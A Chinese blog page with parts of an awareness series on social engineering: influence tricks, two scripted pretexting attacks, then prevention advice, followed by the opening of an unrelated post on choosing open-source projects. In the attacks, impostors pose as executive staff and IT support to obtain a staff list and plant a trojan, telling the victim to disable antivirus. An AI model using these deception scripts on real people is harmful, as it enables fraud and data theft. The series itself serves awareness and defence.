<h3 id="◇案例分析"><a href="#◇案例分析" class="headerlink" title="◇案例分析"></a>◇案例分析</h3><p>　　首先，攻击者通过信息收集中打听到“商业客户资料系统”简称BCIS。另外，攻击者还了解到“客服部门”有BCIS的查询权限。当小黑很自然地说出这两个信息，就会让小白相信自己是公司内的人员。<br>　　接着，小黑通过谎称自己的电脑中毒，来进行示弱并博取小白的同情。<br>　　有了上面这两条，小黑成功的把握就很大啦。如果再辅助一些特定的嗓音和语调，并且在言谈中流露出焦急的心情，那基本上就大功告成了。</p>
<p>　　关于“假冒身份”的话题，就暂时聊到这。本系列的下一个帖子，咱们来聊一下“施加影响”的话题。</p>
<h1 id="扫盲“社会工程学”-3-：攻击手法之【施加影响】"><a href="#扫盲“社会工程学”-3-：攻击手法之【施加影响】" class="headerlink" title="扫盲“社会工程学”[3]：攻击手法之【施加影响】"></a>扫盲“社会工程学”[3]：攻击手法之【施加影响】</h1><p><strong>文章目录</strong></p>
<p>★关于《影响力》<br>★博取好感<br>★通过互惠原理来骗取好处<br>★通过社会认同来施加影响<br>★通过权威来施加压力<br>★总结</p>
<p>上文咱们介绍了社会工程中<strong>包装</strong>的技巧。按照本系列的计划，本文要讨论的内容是：“如何施加影响”。</p>
<h2 id="★关于《影响力》"><a href="#★关于《影响力》" class="headerlink" title="★关于《影响力》"></a>★关于《影响力》</h2><p>　　说到施加影响以及相关的技巧，就不得不提及《影响力》这本书。这真是一本好书啊！<br>　　《影响力》这本书高屋建瓴地总结了“对他人施加影响”的种种伎俩。这些伎俩似乎不够光明正大，但常常能收到奇效。如果你从来没有读过此书，强烈建议你先去拜读一下，再接着来看本帖后续的内容。<br>……<br>……<br>……<br>　　现在，不妨假设你已经拜读过《影响力》。接着，咱们来看看书上的那些技巧是如何运用在社会工程学当中的。</p>
<h2 id="★博取好感"><a href="#★博取好感" class="headerlink" title="★博取好感"></a>★博取好感</h2><p>　　博取好感是施加影响的手法中，最基本的招数。具体的技巧有很多种，咱今天只介绍常见的几种。</p>
<h3 id="◇通过外在特征的“光环效应”"><a href="#◇通过外在特征的“光环效应”" class="headerlink" title="◇通过外在特征的“光环效应”"></a>◇通过外在特征的“光环效应”</h3><p>　　此处所说的外在特征，包括相貌、嗓音、着装、甚至姓名等诸多方面；此处所说的“<strong>光环效应</strong>”（也叫光晕效应、晕轮效应），是指对某人的某个局部特征的看法被扩大化，变成对此人整体的看法。这么说比较抽象，咱来看下面几个例子。另外，俺单独写了一个帖子详细介绍“光环效应”，在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/05/halo-effect.html">这里</a>”。</p>
<p><strong>举例1（以貌取人）</strong><br>据说当年马云创业时，出去推销产品，别人一看到他都觉得他是坏人。显然，相貌和人品没有必然联系。但是很多人在潜意识里，都会把长得歪瓜裂枣的人当成坏人。<br><strong>举例2（以名取人）</strong><br>比如很多歌星、影星仅仅由于演技好，其 fans 就把演技扩大化，认为他们/她们样样都好。其实演技好和人品好没有必然联系。<br>所以俺在前文里强调社会工程的攻击者需要有好的嗓音（有时甚至需要有好的相貌），就是为了能发挥光环效应。</p>
<h3 id="◇通过相似性来博取好感"><a href="#◇通过相似性来博取好感" class="headerlink" title="◇通过相似性来博取好感"></a>◇通过相似性来博取好感</h3><p>　　所谓的“<strong>相似性</strong>”，范畴很广，常见的有如下一些：同学、同乡、同校（校友）、爱好相同（比如都喜欢看球，甚至都喜欢某个球星）、经历相同、等。<br>很多攻击者善于通过看似不经意的闲聊，和被攻击者扯上某种关系，让被攻击者的好感油然而生。</p>
<h2 id="★通过互惠原理来骗取好处"><a href="#★通过互惠原理来骗取好处" class="headerlink" title="★通过互惠原理来骗取好处"></a>★通过互惠原理来骗取好处</h2><p>　　俺在看了《影响力》之后，才意识到互惠原则的效果竟然如此巨大。真是不看不知道，一看吓一跳。具体的例子书上举了很多，俺这里主要总结互惠原则的两种运用招式。</p>
<h3 id="◇初级招式：“投桃报李”式"><a href="#◇初级招式：“投桃报李”式" class="headerlink" title="◇初级招式：“投桃报李”式"></a>◇初级招式：“投桃报李”式</h3><p>　　“投桃报李”式比较好理解，简单说就是给予对方一点小甜头，然后再索取点小回报。<br>　　为了形象点，举例说明：<br>　　比如有个攻击者在信息收集阶段，想了解某个连锁商店店长的信息。攻击者打电话给该商店（接电话的是某店员），谎称自己是一位长期客户，由于该店的服务很好，想写封表扬信给店长。店员一听就很爽，立马就把店长的详细信息告知对方。</p>
<h3 id="◇高级招式：“拒绝-退让”式"><a href="#◇高级招式：“拒绝-退让”式" class="headerlink" title="◇高级招式：“拒绝-退让”式"></a>◇高级招式：“拒绝-退让”式</h3><p>　　“拒绝-退让”式比“投桃报李”式要高级一些。这个招式实际上包含了互惠原理和<strong>对比原理</strong>，如果把握得当，效果比“投桃报李”要好很多。具体的实施分两个步骤进行：先提出一个很高（比较过分）的要求（以下简称 A），对方多半会拒绝；然后，攻击者主动作出让步（撤回该要求），再提一个（相对 A 来说）比较低的要求（以下简称 B），这时对方多半会答应。其实 A 仅仅是一个烟雾弹，并不是攻击者的真实意图。攻击者真正想达成的是 B。<br>　　这个招式的难点在于把握A的尺度。A必须和B形成比较明显的反差（利用对比原理），通过A来衬托出B的微不足道。这样，对方拒绝了A之后，潜意识里觉得B反正很微不足道，再加上互惠原理的作用，就会很容易地接受B。<br>　　比如有些攻击者在收集信息时，可以先索取某个比较敏感的信息，如果对方拒绝了，就转而索取一个不敏感的信息。</p>
<h2 id="★通过社会认同来施加影响"><a href="#★通过社会认同来施加影响" class="headerlink" title="★通过社会认同来施加影响"></a>★通过社会认同来施加影响</h2><p>　　所谓的“社会认同”，通俗地说就是人云亦云、随大流。大多数人都有这个毛病，否则也不会有那么多跟风、赶时髦的家伙了。<br>　　那社会工程者如何运用这个伎俩捏？一个常见的方法就是“造势”。通过制造某种舆论来引导（或者叫“误导”）被攻击者，从而达到目的。这种方式有两个要点：<br>　　首先，要达成某种规模效应。一旦规模形成，由于“社会认同”的影响，就会变成正反馈，导致越来越多的人被卷入。<br>　　其次，要注意引导的技巧。具体要如何“引导”捏？常见的有：“制造狂热”、“制造恐慌”、“制造愤怒”、“制造反感”等方式。当人们处于狂热、恐慌、愤怒、反感等状态时，会变得情绪化。这时候，感性的因素就会占主导，同时会丧失理性的判断，从而被一小撮人所利用。<br>　　从本质上分析，这两个要点依然是借助了心理学层面的因素来起作用。关于造势的例子，大伙儿可以看看源自 IT 行业的 FUD（Fear, Uncertainty, Doubt，具体解释见“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/FUD">这里</a>”）手法。<br>　　写到这里，突然联想到：其实天朝的毛太祖，就是造势、造舆论的高手啊！上述的两个要点发挥得炉火纯青，不得不令人佩服啊！</p>
<h2 id="★通过权威来施加压力"><a href="#★通过权威来施加压力" class="headerlink" title="★通过权威来施加压力"></a>★通过权威来施加压力</h2><p>　　大部分人都有服从权威的倾向。因此攻击者可以通过树立或借助权威，让对方服从自己的一些不太合理的要求。<br>　　比如有的攻击者假冒成某 VP（Vice President）的秘书，声称该 VP 急需某某文件或资料，那么对方就会迫于压力而答应。这个招数在等级森严的组织机构，效果特别好。</p>
<h2 id="★总结"><a href="#★总结" class="headerlink" title="★总结"></a>★总结</h2><p>　　有句话俺必须再啰嗦一下：按照二八原理，<strong>大部分人都是感性的</strong>。为啥上述的这些伎俩能够屡试不爽？就因为这些技巧充分利用了人们感性的弱点。如果你是一个感性的人，那可要小心啦：你可能会容易入上述这些圈套，平时须得小心防范。<br>　　不过捏，凡事总有两面性滴。你一方面要提防别人通过这些招数影响你，另一个方面，你也可以利用这些东东去影响别人。虽说今天是为了介绍社会工程学才扯了这么多施加影响的招数，但这些玩意儿可不仅仅限于社会工程学哦。在很多很多不同的领域（比如：管理、谈判、社交、追 MM/GG、推销 ……），今天讲的这些东西都是非常有用滴。大伙儿一定要活学活用、举一反三啊，才不枉费俺打了这么多字！<br>　　本系列的下文，咱们搞几个综合的示例来分析一下。</p>
<h1 id="扫盲“社会工程学”-4-：【综合运用】举例"><a href="#扫盲“社会工程学”-4-：【综合运用】举例" class="headerlink" title="扫盲“社会工程学”[4]：【综合运用】举例"></a>扫盲“社会工程学”[4]：【综合运用】举例</h1><p><strong>文章目录</strong></p>
<p>★举例1：获取通讯录<br>★举例2：获取财务报表<br>★总结</p>
<p>　　前面的几个帖子已经介绍了社会工程学的一些常见伎俩（主要是“信息收集”、“假冒身份”、“施加影响”这三个手法），今天俺要来举几个综合性的例子。通过这些例子，大伙儿可以见识一下那些社会工程学的老手是如何把各种伎俩有机结合起来，并达到最终的目的。<br>　　为了避免引起不必要的误解，俺事先声明如下：<br>　　由于本人才疏学浅，难以凭空捏造出各种社会工程学案例的场景，因此后面有些例子的灵感，是来自于<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著的《<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》。另外，俺举这些例子只是教大家如何防范，决无教唆的意图。如果有人企图追究俺教唆犯罪的责任，拜托去找<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kevin_Mitnick">米特尼克</a>先生，别来找俺滴麻烦 <strong>:-)</strong></p>
<h2 id="★举例1：获取通讯录"><a href="#★举例1：获取通讯录" class="headerlink" title="★举例1：获取通讯录"></a>★举例1：获取通讯录</h2><p>　　某个聪明的猎头（按照前文的惯例，不妨称之为小黑）需要搞到一家大公司研发部门的通讯录。为了达到目的，小黑决定采取一些社会工程学的技巧。<br>　　首先，要选定突破口——也就是容易被利用的人。在这个案例中，小黑决定从前台和研发部秘书作为突破口。为啥要选择两个人捏？有一个原因在于，这两人的工作性质决定了他们会比较乐于助人，也就比较容易被小黑利用。接下来，咱们看看小黑是如何达到目的。</p>
<h3 id="◇步骤1：获取前台的Email地址"><a href="#◇步骤1：获取前台的Email地址" class="headerlink" title="◇步骤1：获取前台的Email地址"></a>◇步骤1：获取前台的Email地址</h3><p>　　此步骤就是之前的帖子介绍的“信息收集”。由于前台的电子邮件地址不是敏感信息，不会有严格的访问控制，可以比较容易获取。比如想办法拿到前台的名片或者在打电话跟前台套近乎。具体细节俺就不多啰嗦了。</p>
<h3 id="◇步骤2：搞定研发的秘书"><a href="#◇步骤2：搞定研发的秘书" class="headerlink" title="◇步骤2：搞定研发的秘书"></a>◇步骤2：搞定研发的秘书</h3><p>　　接着，小黑打电话给研发的秘书（搞到研发秘书的分机号也不是什么难题），然后谎称自己是总裁办的秘书，<strong>急需</strong>一份研发人员的清单。然后，小黑让研发的秘书把整理好的人员清单发送到 xxxx 邮件地址（也就是步骤1获取的前台 email 地址）。<br>这个步骤是整个计划的关键点。为了达成此步骤，需要用到“假冒身份”和“施加影响”这两个手法。通过冒充总裁办的人，造成一种潜在的威慑。而且小黑在通话的过程中自然流露出焦急的情绪，显得更加逼真。<br>对于研发秘书而言：虽然研发人员的清单比较敏感，但由于索要清单的是总裁办的人，也就不好拒绝了。而且对方留得email地址是本公司的邮箱，想想也就没啥好顾虑的了。</p>
<h3 id="◇步骤3：搞定前台"><a href="#◇步骤3：搞定前台" class="headerlink" title="◇步骤3：搞定前台"></a>◇步骤3：搞定前台</h3><p>　　打完步骤2的电话之后，小黑就赶紧打第3个电话给前台。下面是双方的对话。</p>
<blockquote>
<p>前台：你好，哪位？<br>小黑：我是总裁办的XXX秘书。<br>前台：你有什么事情吗？<br>小黑：我正陪同XX副总裁在某处开会，XX副总裁需要一份资料。我已经找人整理好了，等一下会发到你的邮箱。你收到之后，请帮忙传真到XXXXXXXX号码。<br>前台：好的。还有其它事情吗？<br>小黑：没有了，多谢！</p>
</blockquote>
<p>对于前台而言，她先接到一个电话让她收邮件，紧接着确实收到一份从公司内部邮箱发出的材料。所以她自然也就不会起疑心了。</p>
<h2 id="★举例2：获取财务报表"><a href="#★举例2：获取财务报表" class="headerlink" title="★举例2：获取财务报表"></a>★举例2：获取财务报表</h2><p>　　前面的那个例子稍显简单，再来说一个稍微复杂点的例子。<br>　　某商业间谍兼资深黑客（还是简称为小黑）需要搞到某大公司内部的财务报表（可以卖大价钱哦）。由于这个财务报表是很敏感的资料，一般员工是接触不到滴，只有财务部的少数主管才能看到这些报表。而财务部的主管，肯定都知道这些报表的重要性。所以，小黑再想用”案例1”的伎俩是行不通滴。<br>　　小黑冥思苦想之后，决定采用“木马计”，在财务主管的电脑中植入木马（如果你不晓得“木马”是啥，自己先上网查一下）。一旦木马植入成功，那财务报表就是手到擒来、不费吹灰之力了。具体的实施步骤如下：</p>
<h3 id="◇步骤1：准备阶段"><a href="#◇步骤1：准备阶段" class="headerlink" title="◇步骤1：准备阶段"></a>◇步骤1：准备阶段</h3><p>　　准备阶段主要办三件事：首先，想办法搞到公司的通讯簿。通过案例1，大伙儿应该知道这个不难办到；然后，通过各种途径（具体的途径，请看之前的“信息收集”）了解该公司内部的一些情况（尤其是 IT 支持部和财务部的人员情况）；最后，用<strong>化名</strong>去开通一个手机（有经验的攻击者肯定用假名，以免被抓）。</p>
<h3 id="◇步骤2：忽悠财务主管"><a href="#◇步骤2：忽悠财务主管" class="headerlink" title="◇步骤2：忽悠财务主管"></a>◇步骤2：忽悠财务主管</h3><p>　　由于前面的准备工作，小黑了解到财务部某主管（不妨叫小白）的姓名和分机号。然后小黑打给该主管。下面是双方对话。</p>
<blockquote>
<p>小白：你好，哪位？<br>小黑：我是IT支持部的张三。你是财务部的主管小白吧？<br>小白：对的。有啥事儿？<br>小黑：最近几天，你们财务部的网络正常吗？有没有感觉网络时断时续的？<br>小白：好像没有嘛。<br>小黑：有几个其它的部门反映网络不正常，所以我来问问你们的情况。如果这几天你碰到网络异常，请打电话给我。我最近忙着处理电脑网络的故障，不经常在座位上。你可以打我的手机，号码是13901234567。<br>小白：好的，我记一下。<br>小黑：另外，我想确认一下你电脑的网络端口号。<br>小白：什么是“网络端口号”？<br>小黑：你先找到你电脑的网线，在网线插在墙上的地方应该贴个标签，那上面的写的号码就是你电脑的“网络端口号”。你把上面的号码告诉我。<br>小白：等一下，我看一下……哦，看到了，上面写着“A1B2C3”。<br>小黑：嗯，很好。我只是例行确认一下。祝你工作愉快。再见。</p>
</blockquote>
<h3 id="◇步骤3：欺骗IT支持部"><a href="#◇步骤3：欺骗IT支持部" class="headerlink" title="◇步骤3：欺骗IT支持部"></a>◇步骤3：欺骗IT支持部</h3><p>　　接着小黑耐着性子等待2到3天，然后打电话给 IT 支持部的某工程师（不妨称李四）。由于之前的准备工作，小黑知道李四管理公司的某些路由器和交换机。<br>　　小黑谎称自己是新来的网络工程师，正在财务办公室帮小白排查网络问题，请李四帮忙把网络端口号为“A1B2C3”的网络连接断开。<br>　　对李四而言，由于对方能准确说出小白的姓名以及小白电脑的网络端口号，所以李四就相信了他的话，并按照要求把对应的网络连接断开。</p>
<h3 id="◇步骤4：等待鱼儿上钩"><a href="#◇步骤4：等待鱼儿上钩" class="headerlink" title="◇步骤4：等待鱼儿上钩"></a>◇步骤4：等待鱼儿上钩</h3><p>　　打完这个电话之后，接下来小黑就稍息片刻，等着小白的电话。果然，不出几分钟，小白就打了他的手机。</p>
<blockquote>
<p>小黑：你好，我是IT支持部的张三。你是哪位？<br>小白：我是财务部的小白主管。前几天你给我打过电话的，还记得吗？今天网络果然出问题了。所以打你电话找你帮忙。<br>小黑：哦，是吗？那我帮你查一下，应该很快能搞定的。</p>
</blockquote>
<p>　　大约十分钟之后，小黑重新打给IT支持部的李四，让他把端口号为“A1B2C3”的网络连接重新开通。</p>
<h3 id="◇步骤5：大功告成"><a href="#◇步骤5：大功告成" class="headerlink" title="◇步骤5：大功告成"></a>◇步骤5：大功告成</h3><p>　　网络重新开通之后，小黑又打给小白。</p>
<blockquote>
<p>小白：你好，哪位？<br>小黑：我是IT支持部的张三。刚才已经帮你把网络故障解决了。你现在试试看，网络应该通了。<br>小白：我看一下，嗯，果然通了！太好了！太谢谢你了！<br>小黑：不过，最近几天这个问题可能还会反复出现。<br>小白：啊！那可咋办？我们财务部月底正忙着呢？可经不起这个折腾啊！<br>小黑：办法倒是有一个，你需要安装一个网络模块的补丁，基本上就可以解决这个问题了。我等一下发到你邮箱中。你收到之后，把邮件附件中的程序安装一下就行了。<br>小白：哦，好的。<br>小黑：顺便提醒你一下，有些杀毒软件可能会把这个补丁误报为有害程序。你如果碰上这种情况，可以先把杀毒软件关闭，再重新安装一次就可以了。<br>小白：哦，我晓得了，谢谢。</p>
</blockquote>
<p>　　然后，小黑就往小白的邮箱发了一个木马，并且把邮件的发件人地址伪装成 IT 支持部张三的地址，免得引起怀疑。<br>　　对于小白而言，张三（冒充的）刚刚帮他解决了网络故障。所以小白根本不会怀疑此人的身份。自然也不会怀疑邮件有诈。</p>
<h2 id="★总结-1"><a href="#★总结-1" class="headerlink" title="★总结"></a>★总结</h2><p>　　由于篇幅有限，俺就不多举例了。从上述案例来看，社会工程高手在搞定复杂问题之前，一般会制定好一个计划，并且在计划的每一个步骤都会充分利用前面几个帖子提到的技巧。另外，在整个攻击过程中，攻击者无非就是做一些调研，打几个电话，成本非常低，被抓的风险也很小；而他们一旦得手，获益却很大。可能就是由于这种较大的反差，导致社会工程攻击在整个信息安全领域的比重不断增加。<br>　　本系列的下一个帖子，俺来介绍一下如何防范社会工程学攻击。</p>
<h1 id="扫盲“社会工程学”-5-：你该如何【防范】？"><a href="#扫盲“社会工程学”-5-：你该如何【防范】？" class="headerlink" title="扫盲“社会工程学”[5]：你该如何【防范】？"></a>扫盲“社会工程学”[5]：你该如何【防范】？</h1><p><strong>文章目录</strong></p>
<p>★组织机构该如何做？<br>★个人该如何做？</p>
<p>　　经过前面几个帖子的介绍，大伙儿应该能看出来，社会工程学的应用范围是很广泛滴。它的应用会涉及日常生活的许多领域，绝不仅限于信息安全。所以，如何防范就是一个重要的话题了。今年咱们就来聊一下如何防范。</p>
<h2 id="★组织机构该如何做？"><a href="#★组织机构该如何做？" class="headerlink" title="★组织机构该如何做？"></a>★组织机构该如何做？</h2><p>　　如果你是某公司/某机构里的一个小头目或大头目、甚至老板，那就得多看看这一节；否则的话，直接跳过本节，看下一个章节（个人该如何做）。</p>
<h3 id="◇普及教育"><a href="#◇普及教育" class="headerlink" title="◇普及教育"></a>◇普及教育</h3><p>　　最要紧的一条就是普及教育了。否则俺也不会在电脑前吭哧吭哧打这么多字，写这么个系列了。一些常识性的基础培训是很重要滴。按照二八原理，20%的简单培训就可以防范80%的潜在攻击。由于“<strong>人</strong>”是社会工程攻击的主要对象，并且有经验的攻击者都善于寻找组织机构的弱点，所以普及教育务必要涵盖到每一个人（连公司的扫地阿姨也不要放过哦**:-**）。<br>　　另外要强调的一点是：要重视对新员工的培训。很多时候，新员工往往是攻击者的突破点。首先，新员工初来乍到，跟周围的同事不熟，容易把攻击者误认为同事；其次，新员工往往怕得罪人，容易答应攻击者的各种要求。</p>
<h3 id="◇严格的认证"><a href="#◇严格的认证" class="headerlink" title="◇严格的认证"></a>◇严格的认证</h3><p>　　认证（Authentication）是一个信息安全的常用术语。通俗地说，认证就是解决<strong>某人到底是谁</strong>？<br>　　由于大部分的攻击者都会用到“身份冒充”这个步骤，所以认证就显得非常必要。只要进行一些简单的身份确认，就能够识破大多数假冒者。比如碰到公司内不认识的人找你索要敏感资料，你可以把电话打回去进行确认（最好是打回公司内部的座机）。</p>
<h3 id="◇严格的授权"><a href="#◇严格的授权" class="headerlink" title="◇严格的授权"></a>◇严格的授权</h3><p>　　授权（Authorization）和认证一样，也是一个常用的信息安全术语。通俗地说，授权就是解决<strong>某人到底能干啥</strong>？<br>　　对于组织机构来说，授权要尽量细化、尽量最小化。<br>　　举个例子。如果某软件公司中，<strong>所有的</strong>程序员都可以访问<strong>所有的</strong>源代码，那源代码泄漏的风险就很大。只要有一个人出问题，攻击者就可以得逞。反之，如果每个人只能访问自己开发的那部分代码，那安全风险就会小很多。即使某人上当受骗，也只会泄漏部分代码。</p>
<h3 id="◇信息分类"><a href="#◇信息分类" class="headerlink" title="◇信息分类"></a>◇信息分类</h3><p>　　在组织机构中，最好要有信息分类的制度。根据信息的重要程度，定出若干级别。越是机密的信息，知道的人越少。<br>　　比如在我负责的团队中，源代码的敏感度高于软件安装包。因此，源代码服务器只有开发人员能够访问；而放置安装包的发布服务器，大部分人（比如测试人员、产品人员）都可以访问。</p>
<h3 id="◇别乱丢办公垃圾"><a href="#◇别乱丢办公垃圾" class="headerlink" title="◇别乱丢办公垃圾"></a>◇别乱丢办公垃圾</h3><p>　　看完信息收集，大伙儿应该明白，乱扔垃圾可不光是砸到花花草草的问题，更危险的是给垃圾分析者提供了大量有价值的素材。这也就是为啥要给扫地阿姨培训社会工程学的道理。</p>
<h3 id="◇文化"><a href="#◇文化" class="headerlink" title="◇文化"></a>◇文化</h3><p>　　最后再来说一下企业文化对社会工程攻击的影响。<br>　　在前文，俺已经介绍了“通过权威来施加压力”的攻击手法。如果某个组织机构的等级很森严，就容易给攻击者留下利用的机会。还有一些组织机构，里面的人员都是好好先生，每个角落都是一团和气。这种机构和等级森严的组织一样，容易被攻击者利用。<br>　　所以，假如你碰巧是组织机构内部的一个实权人物，或许可以尝试改变一下现状。不过俺要提醒一句，一个组织机构（尤其是政府机构）的文化是很难轻易改变滴。所以，别对这个招数报太大希望 :-(</p>
<h2 id="★个人该如何做？"><a href="#★个人该如何做？" class="headerlink" title="★个人该如何做？"></a>★个人该如何做？</h2><p>　　前面介绍了企业内部的防范措施，接着就该说说个人该如何应对了。</p>
<h3 id="◇多了解一些社会工程学的手法"><a href="#◇多了解一些社会工程学的手法" class="headerlink" title="◇多了解一些社会工程学的手法"></a>◇多了解一些社会工程学的手法</h3><p>　　俗话说：知己知彼，百战不殆。如果你不想被人坑蒙拐骗，那就得多了解一些坑蒙拐骗的招数。除了俺提到过好几次的《<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著），你还可以通过互联网找到很多类似的资料。这些资料有助于你了解各种新出现的社会工程的手法。<br>　　另外，很多文学作品、影视节目也会掺杂社会工程学的情节。比如前段时间热播的《潜伏》，里面的主人公余则成显然是一个社会工程学老手。细心的同学应该能从中窥探到不少奥妙。</p>
<h3 id="◇保持理性"><a href="#◇保持理性" class="headerlink" title="◇保持理性"></a>◇保持理性</h3><p>　　在<strong>如何施加影响</strong>里，俺已经列举了很多种手法。这些手法不外乎都是利用人【<strong>感性</strong>】的弱点，然后施加影响。所以，尽量保持理性的思维（尤其在和陌生人沟通时）有助于减少你被攻击者忽悠的概率。不过捏，保持理性，<strong>说起来简单，做起来未必简单</strong> :-( 以后俺有空再来聊聊这方面的话题。</p>
<h3 id="◇保持冷静"><a href="#◇保持冷静" class="headerlink" title="◇保持冷静"></a>◇保持冷静</h3><p>　　还有一些“社会工程学”的惯用伎俩是【制造恐慌】。大部分人在慌乱之中就容易入套。<br>　　所以，保持冷静也很重要。不过捏，还是刚才那句话——<strong>说起来简单，做起来未必简单</strong>。</p>
<h3 id="◇保持一颗怀疑的心"><a href="#◇保持一颗怀疑的心" class="headerlink" title="◇保持一颗怀疑的心"></a>◇保持一颗怀疑的心</h3><p>　　这年头，除了骗子是真的，啥都可能是假的。比如，你收到的邮件，发件人地址是很容易伪造滴；比如，你公司座机上看到的来电显示，也可以被伪造；比如，你收到的手机短信，发短信的号码也可以伪造。<br>　　所以，保持一颗怀疑的心，也是非常必要的啊！</p>
<h3 id="◇别乱丢生活垃圾"><a href="#◇别乱丢生活垃圾" class="headerlink" title="◇别乱丢生活垃圾 :)"></a>◇别乱丢生活垃圾 :)</h3><p>　　不光上述提到的办公垃圾有潜在风险，生活垃圾一样也会被垃圾分析者利用。比如有些粗心的同学会把帐单、发票、取款机凭条等东西随意丢在垃圾桶中。一旦碰上有经验的垃圾分析者，你没准就麻烦了。</p>
<h3 id="◇（其它）"><a href="#◇（其它）" class="headerlink" title="◇（其它）"></a>◇（其它）</h3><p>　　肯定还有俺没提及的防范措施，欢迎大伙儿（到博客评论区）补充。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T16:01:33.000Z" title="2021/7/17 上午12:01:33">2021-07-17</time>发表</span><span class="level-item"><time dateTime="2021-07-16T16:04:53.163Z" title="2021/7/17 上午12:04:53">2021-07-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></span><span class="level-item">15 分钟读完 (大约2271个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%EF%BC%9F/">如何选择开源项目？</a></h1><div class="content"><h1 id="如何选择开源项目？"><a href="#如何选择开源项目？" class="headerlink" title="如何选择开源项目？"></a>如何选择开源项目？</h1><p><strong>文章目录</strong></p>
<p>★License（授权协议、许可证）<br>★技术层面的因素<br>★普及程度（用户的人气）<br>★活跃程度（开发的人气）<br>★其它的风险</p>
<p>　　近几年开源项目越发普及，很多商业软件都逐渐引入开源项目。由于俺负责的产品线采用了不少开源项目（主要是 C++、Java、Python），这几年就经常会碰到开源项目选型的问题（从几个具有类似功能的开源软件项目中进行抉择）。今天我就大概聊一下自己的几点看法，供大伙儿参考。</p>
<h2 id="★License（授权协议、许可证）"><a href="#★License（授权协议、许可证）" class="headerlink" title="★License（授权协议、许可证）"></a>★License（授权协议、许可证）</h2><p>　　License 是很多人容易忽略的一个问题，所以我们先来聊一下 License 的问题。因为公司里面开发的软件大都属于商业软件（更严谨的叫法是“专属闭源软件”），根据开源协议和商业的冲突程度，可以分为三种：非常友好、不太友好、很敌对。下面分别介绍一下：</p>
<h3 id="◇对商业闭源软件“很敌对”的协议"><a href="#◇对商业闭源软件“很敌对”的协议" class="headerlink" title="◇对商业闭源软件“很敌对”的协议"></a>◇对商业闭源软件“很敌对”的协议</h3><p>　　先说说“很敌对”的协议：GPL（详细解释请看“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/GNU_General_Public_License">这里</a>”）。GPL 和闭源软件是有严重冲突的。通俗地说，如果某个软件使用了基于 GPL 协议的【动态库或静态库】，则【整个软件】必须也用 GPL 协议发布（这就是大名鼎鼎的【GPL 传染性】）。也就是说——如果你开发的是【闭源】软件，一旦发现自己想用的某个开源库属于 GPL 协议，即使功能再强再好用，也只好忍痛割爱了。<br>　　在此郑重提醒大伙儿，【切莫】抱侥幸心理，偷偷使用。一旦被雪亮的群众眼睛所发现，不光害了自己的名节，公司的名节也不保。</p>
<h3 id="◇对商业闭源软件“不太友好”的协议"><a href="#◇对商业闭源软件“不太友好”的协议" class="headerlink" title="◇对商业闭源软件“不太友好”的协议"></a>◇对商业闭源软件“不太友好”的协议</h3><p>　　因为 GPL 对于商业闭源软件太不友好了，估计当年很多开源库的作者怨声载道。GNU 组织为了缓和一下矛盾，搞出了一个折衷的 LGPL 协议（详细解释看“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/GNU_Lesser_General_Public_License">这里</a>”）。这个协议相对 GPL 来说，宽松了一些：商业闭源软件在【不公开】代码的前提下，可以在产品中使用 LGPL 的开源库。所以 LGPL 属于商业“不太友好”的协议。</p>
<h3 id="◇对商业闭源软件“很友好”的协议"><a href="#◇对商业闭源软件“很友好”的协议" class="headerlink" title="◇对商业闭源软件“很友好”的协议"></a>◇对商业闭源软件“很友好”的协议</h3><p>　　最后来说一下“非常友好”的协议，比较出名的有这几种：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/BSD_license">BSD</a>、<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Mozilla_Public_License">MPL（Mozilla）</a>、<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Apache_License">Apache</a>、<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/MIT_License">MIT</a>。这些协议不但允许项目的使用者使用开源库，有些还允许对开源库进行修改并重新分发。因此用起来特别爽。上述这几个协议在细节上有些小差异，大伙儿可以去它们官网瞧一下。<br>　　另外，有些开源软件使用公共域授权（Public Domain，详细解释看“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Public_domain">这里</a>”）。简单说，就是不作任何限制，软件的使用者可以为所欲为 :)</p>
<h3 id="◇其它协议"><a href="#◇其它协议" class="headerlink" title="◇其它协议"></a>◇其它协议</h3><p>　　上面提到的几种协议都是知名协议。还有少数开源项目不是采用知名协议，而是自己搞了一套协议。如果你碰到这种情况，就得硬着头皮认真读一遍协议上的洋文，看看它对于使用者有些什么限制了。</p>
<h2 id="★技术层面的因素"><a href="#★技术层面的因素" class="headerlink" title="★技术层面的因素"></a>★技术层面的因素</h2><p>　　由于技术层面的考量和你所开发的软件密切相关，因此这方面的评判依据千差万别。我只能挑几个比较通用的说一下。<br>　　假如你开发的是跨平台的项目，那么你选择开源项目就得考虑它支持哪些平台（硬件平台、操作系统平台、数据库平台）。如果你需要支持的平台它不能支持，那就赶紧另找一个。<br>　　有时候编译器的支持也是考虑的指标之一。比如俺曾经实施一个 Java 项目，用户的环境是 JDK 1.4。那么有些用了 Java 1.5 新语法的开源库就不能使用。<br>　　假如你开发的软件是性能敏感的，那选型的时候就要测试一下几个候选项目的性能指标。<br>　　现在安全问题越来越严重。如果你比较在意安全性的话，还得顺便调查一下候选项目是否有安全问题（比如缓冲区溢出的 bug、比如跨站脚本注入等）。</p>
